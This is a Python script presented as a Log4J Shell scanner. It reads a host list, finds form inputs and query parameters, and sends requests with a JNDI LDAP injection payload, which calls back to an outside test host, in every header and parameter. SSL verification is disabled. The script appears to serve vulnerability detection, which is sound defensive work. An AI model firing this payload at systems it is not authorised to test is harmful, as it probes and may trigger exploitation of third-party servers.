#!/usr/bin/env python3

import requests
from requests.exceptions import Timeout
from pprint import pprint
from bs4 import BeautifulSoup
from urllib.parse import urlparse
from pyfiglet import Figlet
import time
import sys
import logging

## Disable bullshit
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
##

class Logger(object):
    def __init__(self, sourceFile, term, log):
        self.prefix = sourceFile.split("/")[-1:][0].split(".")[0]
        self.terminal = term
        self.filename = "./logs/{0}-{1}.log".format(str(self.prefix), str(log))
        self.log = open(self.filename, "w")
        self.terminal = term
   
    def write(self, message):
        self.terminal.write(message)
        self.log.write(message) 

    def flush(self):
        pass    


def setupLogger(sourceFile: str) -> None:
    prefixStr = sourceFile.split("/")[-1:][0].split(".")[0]
    sys.stdout = Logger(sourceFile, sys.stdout, "stdout")
    sys.stderr = Logger(sourceFile, sys.stderr, "stderr")
    return

def welcome() -> None:
    figgerOb = Figlet()
    print(figgerOb.renderText('GoVanguard Log4J Shell Scanner'))
    print("\n")
    print("Tests headers, form elements and query parameters for the Log4J Shell vulnerability.\n")
    return

def makeCalls(callsToMake: list, timeout: int, verifySsl: bool) -> None:
    print("Entering execution phase...")
    print("---------------------------")
    print("Operation Timeout: {0}".format(str(timeout)))
    print("Verify SSL: {0}\n".format(str(verifySsl)))
    print("Executing {0} attacks...".format(str(len(callsToMake))))
    print("--------------------")

    for callToMake in callsToMake:
        try:
            print("Executing {0} to {1}...".format(callToMake['method'], callToMake['url']))
            print("    > Headers {0}".format(callToMake['headers']))
            if callToMake['method'] == 'post':
                requestOb = requests.post(callToMake['url'], headers = callToMake['headers'], timeout = timeout, verify = verifySsl)
            else:
                requestOb = requests.get(callToMake['url'], headers = callToMake['headers'], timeout = timeout, verify = verifySsl)
            requestOb.raise_for_status()
            print("    > Code: {0}\n".format(str(requestOb.status_code)))
        except requests.exceptions.HTTPError as errh:
            print("    > HTTP error: {0}\n".format(str(errh)))
        except requests.exceptions.ConnectionError as errc:
            print("    > Wouldn't connect: {0}\n".format(str(errc)))
        except requests.exceptions.Timeout as errt:
            print("    > Timed out: {0}\n".format(str(errt)))
        except requests.exceptions.RequestException as err:
            print("    > Didn't respond as expected: {0}\n".format(str(err)))
        except Exception as err:
            print("    > Something else failed: {0}\n".format(str(err)))
        time.sleep(2)
    return

def buildHosts(sourceFile: list, schemes = ['https', 'http']) -> list:
    print("Entering host collection phase...")
    print("---------------------------------")
    if not sourceFile:
        print("    > No endpoint source file supplied")
        sys.exit(1)
    try:
        print("    > Source File: {0}".format(str(sourceFile)))
        print("    > Schemes: {0}".format(str(schemes)))
        fileObj = open(sourceFile, "r")
        fileData = fileObj.read().strip().split("\n")
    except Exception as err:
        print("    > Couldn't read source file {0}: {1}".format(str(sourceFile), str(err)))
        sys.exit(1)

    hostsToTest = []
    for scheme in schemes:
        hostsToTest += ["{0}://{1}".format(str(scheme), str(line)) for line in fileData]
    print("    > {0} endpoints\n".format(str(len(hostsToTest))))
    return hostsToTest

def analyzeHosts(hostsToTest: list, timeout: int, verifySsl: bool) -> list:
    print("Entering analysis phase...")
    print("--------------------------")
    print("Operation Timeout: {0}".format(str(timeout)))
    print("Verify SSL: {0}\n".format(str(verifySsl)))
    print("Executing analysis on {0} endpoints...".format(str(len(hostsToTest))))
    print("--------------------------------------")

    callsToMake = []
    for hostToTest in hostsToTest:
        endPoint = hostToTest
        urlParserOb=urlparse(endPoint)
        url = endPoint
        # Shitty replace
        url = url.replace(urlParserOb.path, "").replace(urlParserOb.query, "").replace(urlParserOb.fragment, "").replace("?", "")

        try:
            print("Analyzing {0}...".format(str(endPoint)))
            requestOb = requests.get(url, timeout = timeout, verify = verifySsl)
            responseText = requestOb.text
            requestOb.raise_for_status()
            print("    > Code: {0}".format(str(requestOb.status_code)))
        except requests.exceptions.HTTPError as errh:
            print("    > HTTP error: {0}\n".format(str(errh)))
            continue
        except requests.exceptions.ConnectionError as errc:
            print("    > Wouldn't connect: {0}\n".format(str(errc)))
            continue
        except requests.exceptions.Timeout as errt:
            print("    > Timed out: {0}\n".format(str(errt)))
            continue
        except requests.exceptions.RequestException as err:
            print("    > Didn't respond as expected: {0}\n".format(str(err)))
            continue
        except Exception as err:
            print("    > Something else failed: {0}\n".format(str(err)))
            continue

        soup = BeautifulSoup(responseText, features="lxml")

        allParameters = []

        queryParameters = [str(inputPair.split("=")[0]) for inputPair in urlParserOb.query.split("&&") if len(inputPair.split("=")[0]) > 0]
        formInputs = [str(inputObj.attrs['name']) for inputObj  in soup.find_all('input') if str(inputObj.attrs['type']) != 'submit']

        if queryParameters:
            print("    > Found query params: {0}".format(str(queryParameters)))
            allParameters = allParameters + queryParameters

        if formInputs:
            print("    > Found form inputs: {0}".format(str(formInputs)))
            allParameters = allParameters + formInputs

        formSearch = soup.find_all('form')
        if len(formSearch) > 0:
            formObj = soup.find_all('form')[0]
            formAttrs = formObj.attrs
            formAction = formAttrs['action']
            formMethod = formAttrs['method']
            print("    > Form action: {0}, Form method: {1}\n".format(str(formAction), str(formMethod).upper()))
        else:
            formMethod = "get"
            print("    > Form method: {0}\n".format(str(formMethod).upper()))

        headers = requestOb.headers
        headers = headers.copy()

        # Some extra headers to try
        headers['User-Agent'] = 'log4j tester'
        headers['Referrer-Policy'] = 'origin'
        headers['Accept'] = '*/*'
        headers['Logger'] = 'debug'

        newHeaderSets = []
        lenHeaders = len(headers)

        for headerEntry in range(0, lenHeaders):
            newHeaders = headers.copy()
            targetHeader = list(newHeaders.keys())[headerEntry]
            newHeaders[targetHeader] = testPayload
            newHeaderSets.append(newHeaders)

        if formMethod == "post":
            callStr = "{0}/{1}".format(url, formAction)
        else:
            callStr = url

        for parameter in allParameters:
            callStr = callStr + "?{0}={1}".format(parameter, testPayload)

        for newHeaderSet in newHeaderSets:
            callsToMake.append({'url': callStr, 'headers': newHeaderSet, 'method': formMethod.lower()})
    return callsToMake


sourceFile = "shitHosts.txt"
# Payload from https://log4shell.huntress.com/
testPayload = "${jndi:ldap://log4shell.huntress.com:1389/BLAH}"
timeout = 5
verifySsl = False

setupLogger(sourceFile)
welcome()
hostToTest = buildHosts(sourceFile)
callsToMake = analyzeHosts(hostToTest, timeout, verifySsl)
makeCalls(callsToMake, timeout, verifySsl)
